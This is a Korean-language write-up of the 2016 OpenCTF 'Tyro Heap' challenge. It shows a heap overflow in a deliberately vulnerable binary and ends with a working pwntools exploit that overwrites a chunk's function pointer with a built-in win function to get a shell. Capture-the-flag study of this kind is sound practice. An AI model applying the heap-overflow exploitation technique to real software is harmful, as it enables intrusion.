# [2016_OpenCTF] \[PWN] Tyro Heap

```
[*] '/root/labs/ctf/2016_openctf/tyro_heap/tyro_heap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### 취약점 - Heap Overflow

```
Tyro Heap
c) create heap object
a) read type a into object
b) read type b into object
f) free object
e) run object function
q) quit
::> c
object #0 created
c) create heap object
a) read type a into object
b) read type b into object
f) free object
e) run object function
q) quit
::> c
object #1 created
c) create heap object
a) read type a into object
b) read type b into object
f) free object
e) run object function
q) quit
::> b
object id ?: 0
give me input_b: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
got [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]

0x804b000 FASTBIN {
  prev_size = 0x0, 
  size = 0x29, 
  fd = 0x80484e0 <puts@plt>, 
  bk = 0x61616161, 
  fd_nextsize = 0x61616161, 
  bk_nextsize = 0x61616161
}
0x804b028 PREV_INUSE {
  prev_size = 0x61616161, 
  size = 0x61616161, 
  fd = 0x61616161, 
  bk = 0x61616161, 
  fd_nextsize = 0x61616161, 
  bk_nextsize = 0x61616161
}
```

read type b into object 기능에서 힙 오버플로우가 가능합니다.

### Exploit

1. chunk가 만들어지면 해당 청크의 첫 4바이트는 puts@plt로, run object function 기능을 실행하면 이 부분을 참조하여 함수를 실행합니다.
2. 청크를 2개 만들어놓고 오버플로우를 통해 두번째 청크의 주소를 win 함수의 주소로 바꾼 후, run object function 기능을 실행하면 쉘을 획득할 수 있습니다.(win 함수는 출제자가 바이너리에 내장시켜 놓았습니다.)

```python
from pwn import *

p = process("./tyro_heap")
print p.recv()
p.sendline("c")
print p.recv()
p.sendline("c")
print p.recv()

p.sendline("b")
print p.recv()
p.sendline("0")
print p.recv()
payload =""
payload+="a"*0x20
payload+=p32(0x29)
payload+=p32(0x08048660)
p.sendline(payload)
print p.recv()
p.sendline("e")
print p.recv()
p.sendline("1")
p.interactive()
```

